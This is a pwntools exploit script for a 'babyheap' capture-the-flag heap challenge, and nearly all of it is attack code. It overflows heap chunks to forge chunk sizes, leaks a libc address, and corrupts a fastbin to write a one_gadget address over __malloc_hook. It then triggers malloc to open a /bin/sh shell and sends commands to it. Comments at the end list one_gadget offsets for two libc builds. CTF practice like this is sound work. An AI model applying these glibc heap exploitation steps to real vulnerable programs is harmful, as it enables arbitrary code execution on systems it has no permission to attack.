from pwn import *

r=process('./babyheap_69a42acd160ab67a68047ca3f9c390b9')
#r=process('./babyheap_69a42acd160ab67a68047ca3f9c390b9',env={"LD_PRELOAD": "./libc.so.6_b86ec517ee44b2d6c03096e0518c72a1"})
#libc = ELF('libc.so.6_b86ec517ee44b2d6c03096e0518c72a1')
libc=ELF("libc-2.23.so")
#gdb.attach(r)

pause()
def allocate(size):
    r.sendline("1")
    r.recvuntil(": ")
    r.sendline(str(size))
    r.recvuntil(": ")
    sleep(1)


def fill(num,content):
    r.sendline("2")
    r.recvuntil(": ")
    r.sendline(str(num))
    r.recvuntil(": ")
    r.sendline(str(len(content)))
    r.recvuntil(": ")
    r.sendline(content)
    r.recvuntil(": ")
    sleep(2)

def free(num):
    r.sendline("3")
    r.recvuntil(": ")
    r.sendline(str(num))
    r.recvuntil(": ")
    sleep(1)


allocate(0x20)#0
allocate(0x20)#1
allocate(0x20)#2
allocate(0x20)#3
allocate(0x100)#4
allocate(0x20)

fill(4,"ZZZZZZZZ")
pause()

free(0)
free(2)
fill(1,"D"*(0x20+8)+p64(0x31)+"\xc0")
fill(3,"Q"*(0x20+8)+p64(0x31)+("x")*40+p64(0x31))

allocate(0x20)
allocate(0x20)# get number 4 chunk but name no2

fill(3,"Q"*(0x20+8)+p64(0x111))
free(4)

log.info("leaking libc")
r.recvuntil(": ")
r.recvuntil(": ")
r.recvuntil(": ")
r.recvuntil(": ")
r.recvuntil(": ")

r.sendline("4")
r.recvuntil(": ")
r.sendline("2")
r.recvuntil("\n")
leak=r.recvuntil("\n")
print leak
leaked=leak[:6]
leaked=u64(leaked.ljust(8,"\x00"))
print "leaked : "+hex(leaked)
#cloud
libc_base=leaked-3951480

#local
#libc_base=leaked-3771224

print "libc base = "+hex(libc_base)
realloc_hook=libc_base+libc.symbols['__realloc_hook']
print "realloc_hook = "+hex(realloc_hook)
malloc_hook=libc_base+libc.symbols['__malloc_hook']
print "malloc_hook = "+hex(malloc_hook)
#local
#one=libc_base+0x3f32a

#cloud
one=libc_base+0x4526a 
print "onegadget  "+hex(one)


#exploit
allocate(0x60)#4
allocate(0x60)#6
free(6)
fill(4,"X"*(0x60+8)+p64(0x71)+p64(malloc_hook-35))
free(1)# to clean up the 0x78 on the main_arena, since it will cause size problem on the heap

allocate(0x60)#1
allocate(0x60)#6 <mallochook

fill(6,"P"*19+p64(one))#P*19 are the padding
sleep(2)
allocate(100000)#allocate big chunk will triger malloc_hook
r.sendline("$0")
r.sendline("ls -al")

r.interactive()



#0x45216 execve("/bin/sh", rsp+0x30, environ)
#constraints:
 # rax == NULL

#0x4526a execve("/bin/sh", rsp+0x30, environ)
#constraints:
#  [rsp+0x30] == NULL

#0xf02a4 execve("/bin/sh", rsp+0x50, environ)
#constraints:
#  [rsp+0x50] == NULL

#0xf1147 execve("/bin/sh", rsp+0x70, environ)
#constraints:
#  [rsp+0x70] == NULL


#--------------------------------------------------#
# 0x3f2d6 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x3f32a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xd67cf execve("/bin/sh", rsp+0x60, environ)
# constraints:
#   [rsp+0x60] == NULL
